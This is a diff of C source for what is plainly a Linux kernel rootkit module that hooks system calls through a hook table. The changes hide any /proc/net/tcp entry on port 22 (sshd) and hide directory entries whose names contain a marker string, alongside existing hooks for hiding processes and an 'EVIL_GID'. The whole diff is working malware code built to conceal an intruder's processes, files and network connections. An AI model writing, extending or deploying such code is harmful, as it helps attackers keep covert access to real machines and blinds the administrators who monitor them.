@@ -4,9 +4,13 @@
 
 #define NR_syscalls 325
 
-#define _H4X0R_ "BBB"
+/*from net/ipv4/tcp_ipv4.c*/
+#define TMPSZ 150
 
 unsigned int sys_table_global = 0;
+
+/* Port to hide, 0x0016 = 22, i.e., sshd */
+char port[12]="0016";
 
 void *hook_table[NR_syscalls];
 
@@ -60,10 +64,12 @@ asmlinkage static void hook_example_exit(int status);
 #define EVIL_GID    2701 /* 37 73 */
 #define PID_TO_HIDE 2334
  
+#define _FILE_TO_HIDE_ "AAA"
+static char *HIDE           = "AAA";
+
 signed short hidden_pids[SHRT_MAX];
 unsigned long long inode    = 0;   /* The inode of /etc/modules */
-static char *HIDE           = "AAA";
-//static char *HIDE           = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00";
+
 struct proc_dir_entry *tcp;
 
 int errno;
@@ -238,7 +244,6 @@ asmlinkage static int hook_getdents64 (unsigned int fd, struct linux_dirent64 __
 asmlinkage static int hook_getdents32 (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage static int hook_execve(const char *filename, char *const argv[], char *const envp[]);
 //asmlinkage int hook_execve(struct pt_regs regs);
-asmlinkage static int hook_socketcall(int call, unsigned long *args);
 asmlinkage static int hook_fork(struct pt_regs regs);
 asmlinkage static void hook_exit(int error_code);
 asmlinkage static int hook_chdir(const char *path);
@@ -282,7 +287,6 @@ static void __init_hook_table(void)
     hook_table[__NR_chdir]          = (void *)hook_chdir;
     hook_table[__NR_open]           = (void *)hook_open;
 //    hook_table[__NR_execve]         = (void *)hook_execve;
-    hook_table[__NR_socketcall]     = (void *)hook_socketcall;
     hook_table[__NR_fork]           = (void *)hook_fork;
     hook_table[__NR_exit]           = (void *)hook_exit;
     hook_table[__NR_kill]           = (void *)hook_kill;
@@ -392,8 +396,8 @@ asmlinkage static int hook_getdents64 (unsigned int fd, struct linux_dirent64 __
 				}
 			}
 
-			// Hide process with hide flag set and Hide file whose name contains a string defined by _H4X0R_
-			if((hide_proc == 1) || (our_strstr((char *) &(dir3->d_name),(char *) _H4X0R_)!=NULL)){
+			// Hide process with hide flag set and Hide file whose name contains a string defined by _FILE_TO_HIDE_
+			if((hide_proc == 1) || (our_strstr((char *) &(dir3->d_name),(char *) _FILE_TO_HIDE_)!=NULL)){
             			printk(KERN_ERR "*** getdents64 dealing with hidden proc entry\n");
 				if(t!=0)
 					our_memmove(dir3,(char *) dir3+dir3->d_reclen,t);
@@ -598,97 +602,28 @@ static int hook_getpriority(int which, int who)
     return (*original_sys_getpriority)(which, who);
 }
 
-/* 
-    When creating a new socket check if caller is hidden, if so set the socket as hidden.
-    FILE_HIDE since sockets are files.
-*/
-
-asmlinkage 
-static int hook_socketcall(int call, unsigned long *args)
+char *strnstr(const char *haystack, const char *needle, size_t n)
 {
-    long ret;
-    struct file *filep;
-
-    void **sys_p = (void **)sys_table_global;
-    asmlinkage int (*original_socket_call)(int call, unsigned long *args) = sys_p[__NR_socketcall];
-
-    ret = original_socket_call(call, args);
-    if((current->flags & PROC_HIDDEN) && ret > 0)
-    {
-        filep = fget(ret);
-        if(filep == NULL)
-        {
-            /* some call will create sockets(recv, send) they will be destroyed anyway */
-            return ret;
-        }
-        filep->f_flags = filep->f_flags | FILE_HIDE;
-
-    }
-    return ret;
+        char *s = our_strstr(haystack, needle);
+        if (s == NULL)
+                return NULL;
+        if (s-haystack+our_strlen(needle) <= n)
+                return s;
+        else
+                return NULL;
 }
 
 /* 
     This function is called when /net/proc/tcp is read, its in charge of 
     writing the data about current sockets, so we need to subvert that data.
 */
-
 static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    struct sock *sock = (struct sock *) v;
-    struct socket *socke;
-    struct file *filep;
-  
-  /*
-  //debbuging
-    struct inet_sock *inet;
-    __be32 dest;
-    __be32 src;
-  __u16 destp;
-  __u16 srcp;
-  */
+        int retval=(*original_tcp4_seq_show)(seq, v);
 
-    /* First call, v is just a number, it prints the headers */
-    if(v == SEQ_START_TOKEN)
-    {
-        return (*original_tcp4_seq_show)(seq, v);
-    }
-
-    /*
-    // This is great for debugging
-    inet = inet_sk(sock);
-    dest = inet->daddr;
-    src = inet->rcv_saddr;
-    destp = ntohs(inet->dport);
-    srcp = ntohs(inet->sport);
-    printk("\n%d:%d %d:%d\n", src, srcp, dest, destp);
-    printk("current is %s and flags are %d\n", current->comm, current->flags);
-    */
-
-    /* Get the associated socket to sock, anf from there the file */
-
-    socke = sock->sk_socket;
-    /* Dont know why this happens, but sk_socket get set to 1 */
-    if(socke == NULL || (int)socke == 1)
-    {
-        return 0;
-    }
-    filep = socke->file;
-    if(current->flags & PROC_HIDDEN)
-    {
-        /* Hidden processes see all */
-        return (*original_tcp4_seq_show)(seq, v);
-    }
-    /* Check if its not hidden */
-    if(!(filep->f_flags & FILE_HIDE))
-    {
-        /* Not hidden, write all data */
-        return (*original_tcp4_seq_show)(seq, v);
-    }
-    else
-    {
-        /*This socket is hidden, dont print anything about it  */
-        return 0;
-    }
+        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
+                seq->count -= TMPSZ;
+	return retval;
 }
 
 /* limited /proc/ based listing hiding */
